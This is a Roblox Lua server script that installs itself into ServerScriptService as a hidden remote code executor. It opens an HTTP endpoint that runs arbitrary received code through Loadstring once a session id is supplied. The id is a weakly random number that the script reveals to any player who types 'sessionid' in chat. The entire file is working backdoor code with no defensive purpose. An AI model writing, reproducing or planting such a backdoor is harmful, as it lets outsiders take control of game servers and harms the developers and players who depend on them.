script.Parent = game.ServerScriptService.ServerifyInjector
local Players = game:GetService("Players")
local HttpService = game:GetService("HttpService")

local ModulesFolder = script.Parent.Modules

local LuaExp = require(ModulesFolder.LuaExp)
local Loadstring = require(ModulesFolder.Loadstring)
local attached = false
local currsessionid = tostring(math.random(1, 2000))

coroutine.wrap(function ()
	local app = LuaExp()
	app.use(LuaExp.json)
	app.get("/", function (req, res)
		print('Got request to POST on "/"')
		res.status(200).send()
	end)
	app.post("/attach", function (req, res)
		local sessionid = req.body['sessionid']
		if sessionid == currsessionid then
			if attached == false then
				attached = true
				print("Attached")
			end
		end
		res.status(200).send()
	end)
	app.post("/execute", function (req, res)
		local code = req.body['code']
		local sessionid = req.body['sessionid']
		if sessionid == currsessionid then
			Loadstring(code)()
			print("Executed")
		end
		res.status(200).send()
	end)
	app.listen("ScriptifySession_".. game.PlaceId.. "_".. currsessionid, function (url, auth)
		print("ScriptifySession listen on ".. url)
		coroutine.wrap(function ()
			for _, plr in pairs(Players:GetPlayers()) do
				plr.Chatted:Connect(function (msg, rec)
					if string.find(msg, "sessionid") then
						coroutine.wrap(function ()
							local Message = Instance.new("Message")
							Message.Parent = workspace
							Message.Text = currsessionid
							wait(1)
							Message:Destroy()
						end)()
					end
				end)
			end
		end)()
	end)
end)()
